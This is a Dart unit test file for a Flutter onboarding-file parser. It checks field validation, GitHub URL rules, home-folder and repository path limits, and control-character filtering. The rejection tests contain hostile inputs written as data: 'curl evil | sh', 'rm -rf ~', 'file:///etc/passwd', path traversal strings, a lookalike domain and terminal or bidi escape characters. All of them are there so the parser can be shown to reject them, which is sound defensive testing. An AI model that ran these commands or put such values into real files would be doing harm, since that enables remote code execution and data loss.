import 'dart:convert';

import 'package:flutter_test/flutter_test.dart';
import 'package:gita/core/onboarding/onboarding_file.dart';

Map<String, Object?> _valid() => {
  'format': 1,
  'name': 'Example Co',
  'tools': {'git': 'required', 'gh': 'optional', 'claude': 'required'},
  'cleanup': 'ask',
  'accounts': [
    {'id': 'work', 'label': 'Example', 'emailDomain': 'example.com'},
    {'id': 'lab', 'label': 'Example Lab', 'emailDomain': '@Example-Lab.com', 'question': 'Your lab email'},
  ],
  'steps': [
    {'type': 'signIn', 'account': 'lab'},
    {'type': 'repo', 'account': 'lab', 'url': 'https://github.com/example-lab/handbook.git', 'dir': '~/handbook'},
    {'type': 'companyFile', 'account': 'work', 'repoDir': '~/handbook', 'path': 'gita/work.json'},
    {'type': 'repoScript', 'repoDir': '~/handbook', 'windows': 'setup.ps1', 'unix': 'setup.sh'},
    {'type': 'signIn', 'account': 'work'},
    {'type': 'claudeCode'},
    {'type': 'doctor'},
  ],
};

OnboardingFile _parse(Map<String, Object?> m) => OnboardingFile.parse(jsonEncode(m));

Matcher _fails(String text) => throwsA(isA<FormatException>().having((e) => e.message, 'message', contains(text)));

void main() {
  group('a valid onboarding file', () {
    test('parses accounts, tools and every step type in order', () {
      final f = _parse(_valid());
      expect(f.name, 'Example Co');
      expect(f.tools, {'git': ToolNeed.required, 'gh': ToolNeed.optional, 'claude': ToolNeed.required});
      expect(f.cleanup, CleanupMode.ask);
      expect(f.accounts.map((a) => a.id), ['work', 'lab']);
      expect(f.account('lab').emailDomain, 'example-lab.com');
      expect(f.account('lab').emailQuestion, 'Your lab email');
      expect(f.account('work').emailQuestion, 'Your @example.com email');
      expect(f.steps.map((s) => s.runtimeType), [
        SignInStep, RepoStep, CompanyFileStep, RepoScriptStep, SignInStep, ClaudeCodeStep, DoctorStep, //
      ]);
      final repo = f.steps[1] as RepoStep;
      expect(repo.name, 'handbook');
      expect(repo.dir, '~/handbook');
    });

    test('tools left out are skipped, cleanup defaults to ask', () {
      final m = _valid()
        ..remove('tools')
        ..remove('cleanup');
      final f = _parse(m);
      expect(f.tools.values.toSet(), {ToolNeed.skip});
      expect(f.cleanup, CleanupMode.ask);
    });

    test('accepts an email only at the account domain', () {
      final a = _parse(_valid()).account('work');
      expect(a.acceptsEmail('Dev@Example.com'), isTrue);
      expect(a.acceptsEmail('dev@example.com.evil.net'), isFalse);
      expect(a.acceptsEmail('dev@notexample.com'), isFalse);
      expect(a.acceptsEmail('not an email'), isFalse);
    });
  });

  group('the file is rejected when', () {
    test('it is not JSON or too large', () {
      expect(() => OnboardingFile.parse('{nope'), _fails("isn't valid JSON"));
      expect(() => OnboardingFile.parse(' ' * (OnboardingFile.maxBytes + 1)), _fails('larger than 64 KB'));
    });

    test('the format is not 1', () {
      expect(() => _parse(_valid()..['format'] = 2), _fails('update Gita'));
    });

    test('a field is unknown, so typos are not silently ignored', () {
      expect(() => _parse(_valid()..['acounts'] = []), _fails('unknown field "acounts"'));
      final m = _valid();
      ((m['steps'] as List)[0] as Map)['run'] = 'rm -rf ~';
      expect(() => _parse(m), _fails('unknown field "run"'));
    });

    test('a step type is not one of the fixed ones', () {
      final m = _valid();
      (m['steps'] as List).add({'type': 'shell', 'command': 'curl evil | sh'});
      expect(() => _parse(m), _fails('must be one of'));
    });

    test('a step names an account that does not exist', () {
      final m = _valid();
      (m['steps'] as List)[0] = {'type': 'signIn', 'account': 'nobody'};
      expect(() => _parse(m), _fails('is not one of the accounts'));
    });

    test('accounts repeat an id, label or domain', () {
      final m = _valid();
      (m['accounts'] as List).add({'id': 'work', 'label': 'Other', 'emailDomain': 'other.com'});
      expect(() => _parse(m), _fails('used twice'));
      final m2 = _valid();
      (m2['accounts'] as List).add({'id': 'x', 'label': 'example', 'emailDomain': 'other.com'});
      expect(() => _parse(m2), _fails('label "example" is used twice'));
      final m3 = _valid();
      (m3['accounts'] as List).add({'id': 'x', 'label': 'X', 'emailDomain': 'example.com'});
      expect(() => _parse(m3), _fails('used by two accounts'));
    });

    test('a repo address is not https://github.com/owner/repo', () {
      for (final url in [
        'http://github.com/a/b.git',
        'https://github.com.evil.net/a/b.git',
        'git@github.com:a/b.git',
        'https://github.com/a',
        'https://github.com/a/b/../c',
        'file:///etc/passwd',
      ]) {
        final m = _valid();
        ((m['steps'] as List)[1] as Map)['url'] = url;
        expect(() => _parse(m), _fails('must be a GitHub address'), reason: url);
      }
    });

    test('a folder is outside the home folder', () {
      for (final dir in ['/etc', '~', '~/../x', '~/a//b', r'~\a', 'C:/x', '~/./a']) {
        final m = _valid();
        ((m['steps'] as List)[1] as Map)['dir'] = dir;
        expect(() => _parse(m), _fails('inside your home folder'), reason: dir);
      }
    });

    test('a path leaves the repository or a script has the wrong kind', () {
      for (final path in ['../x.json', '/etc/x', 'a/../../x', r'a\b', 'C:x']) {
        final m = _valid();
        ((m['steps'] as List)[2] as Map)['path'] = path;
        expect(() => _parse(m), _fails('inside the repository'), reason: path);
      }
      final m = _valid();
      ((m['steps'] as List)[3] as Map)['unix'] = 'setup.py';
      expect(() => _parse(m), _fails('.sh script'));
      final m2 = _valid();
      ((m2['steps'] as List)[3] as Map).remove('windows');
      ((m2['steps'] as List)[3] as Map).remove('unix');
      expect(() => _parse(m2), _fails('needs "windows", "unix" or both'));
    });

    test('repoDir is not an earlier repo step', () {
      final m = _valid();
      ((m['steps'] as List)[2] as Map)['repoDir'] = '~/other';
      expect(() => _parse(m), _fails('earlier "repo" step'));
    });

    test('text has control characters or is too long', () {
      expect(() => _parse(_valid()..['name'] = 'Evil\u001b[2J'), _fails('control characters'));
      expect(() => _parse(_valid()..['name'] = 'Bidi\u202eTrick'), _fails('control characters'));
      expect(() => _parse(_valid()..['name'] = 'x' * 65), _fails('longer than 64'));
    });

    test('an email domain is not a domain', () {
      final m = _valid();
      ((m['accounts'] as List)[0] as Map)['emailDomain'] = 'not a domain';
      expect(() => _parse(m), _fails('is not a domain'));
    });
  });
}
